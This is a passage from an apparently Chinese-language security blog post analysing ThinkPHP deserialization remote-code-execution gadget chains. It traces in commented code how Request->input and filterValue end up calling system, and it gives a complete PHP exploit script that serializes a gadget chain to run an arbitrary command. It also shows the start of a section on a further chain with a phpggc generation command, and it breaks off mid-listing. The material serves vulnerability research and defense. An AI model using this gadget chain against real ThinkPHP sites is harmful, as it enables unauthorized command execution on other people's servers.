class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $name 是字符串不是数组，不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\Request-&gt;input</code> 函数</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// is_null 判断 $filter === null</span></span><br><span class="line">    <span class="comment">// 由于 $filter = &#x27;&#x27;，因此进入 else 分支</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// $filter 为空字符串，因此设置 $filter = $this-&gt;filter = &quot;system&quot;</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$filter</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 $filter 末尾追加一个 $defatlt(null)</span></span><br><span class="line">    <span class="comment">// 此时 $filter = [&#x27;system&#x27;, null] </span></span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取变量 支持过滤和默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array        $data    数据源 = [&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27; =&gt; &#x27;calc&#x27;]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|false $name    字段名 = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed        $default 默认值 = null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $filter  过滤函数 = &quot;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析 $name = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 按 &#x27;/&#x27; 分割 $name 字符串</span></span><br><span class="line">            <span class="comment">// $name = &quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span></span><br><span class="line">            <span class="comment">// $type = &quot;getAttr&gt;&quot;</span></span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 $name 按 . 拆分成多维数组进行判断</span></span><br><span class="line">        <span class="comment">// 这里只拆出一项 &quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">                <span class="comment">// 从 $data 中取出要执行的命令赋值给 $data</span></span><br><span class="line">                <span class="comment">// $data = [&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27; =&gt; &#x27;calc&#x27;][&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27;] = &#x27;calc&#x27;</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// $data 是字符串不是对象，因此不进入判断</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    <span class="comment">// 这里因为 $fileter = &quot;&quot; 且 $default = null</span></span><br><span class="line">    <span class="comment">// 因此在 getFilter 函数经过一系列判断之后返回 [$this-&gt;fileter, null]</span></span><br><span class="line">    <span class="comment">// 即 [&quot;system&quot;, null]</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// $data 是要执行的命令字符串，不是数组</span></span><br><span class="line">    <span class="comment">// 因此进入 else 分支调用 filterValue 函数。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\Request-&gt;filterValue</code> 函数先是从 <code>$filters</code> 中移除最后一项 <code>null</code>，之后遍历 <code>$filters</code> 数组依次调用里面的函数并且参数为 <code>$value</code>。由于函数和参数都可控，因此我们可以调用 <code>system</code> 函数执行任意命令。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归过滤给定的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value   键值 = &#x27;calc&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $key     键名 = &#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $filters 过滤方法+默认值 = [&#x27;system&#x27;, null]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 将 $filter 数组中的最后一项 null 取出</span></span><br><span class="line">    <span class="comment">// 此时 $filter 数组还剩一项 &quot;system&quot;</span></span><br><span class="line">    <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">            <span class="comment">// 调用 $filter 中的唯一一项函数 &quot;system&quot;</span></span><br><span class="line">            <span class="comment">// 参数是 $value 即我们要执行的命令 &quot;calc&quot;</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>, <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">Memcache</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;HEXENS&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Memcached</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">get</span>, $<span class="title class_">filter</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;get = [<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span> =&gt; <span class="variable">$parameter</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter = <span class="variable">$function</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Request</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>, <span class="variable">$handler</span>, <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">Request</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = (<span class="keyword">new</span> <span class="title class_">\ReflectionClass</span>(<span class="title class_">Output</span>::<span class="variable language_">class</span>))-&gt;<span class="title function_ invoke__">newInstanceWithoutConstructor</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>, <span class="variable">$query</span>, <span class="variable">$bindAttr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>\<span class="title class_">HasOne</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span>, <span class="variable">$error</span>, <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>(&quot;<span class="title class_">system</span>&quot;, &quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RCE3（影响-6-0-1-）"><a href="#RCE3（影响-6-0-1-）" class="headerlink" title="RCE3（影响 6.0.1+）"></a>RCE3（影响 6.0.1+）</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li><p><strong>影响范围</strong> ：6.0.1+</p>
</li>
<li><p><strong>生成命令</strong> ：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE3 system <span class="built_in">id</span> -b -u</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化对象</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE3.svg"
                      alt="TPRCE3"
                ></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">League\Flysystem\Cached\Storage\Psr6Cache <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [<span class="attr">pool</span>:League\Flysystem\Cached\Storage\<span class="attr">Psr6Cache</span>:<span class="keyword">private</span>] =&gt; League\Flysystem\<span class="built_in">Directory</span> <span class="title function_ invoke__">Object</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="attr">filesystem</span>:<span class="keyword">protected</span>] =&gt; League\Flysystem\<span class="built_in">Directory</span> <span class="title function_ invoke__">Object</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="attr">filesystem</span>:<span class="keyword">protected</span>] =&gt; think\Validate <span class="title function_ invoke__">Object</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="attr">type</span>:<span class="keyword">protected</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [key] =&gt; system</span><br><span class="line">                                )</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="attr">path</span>:<span class="keyword">protected</span>] =&gt; calc</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">path</span>:<span class="keyword">protected</span>] =&gt; key</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="attr">autosave</span>:<span class="keyword">protected</span>] =&gt; </span><br><span class="line">    [<span class="attr">key</span>:<span 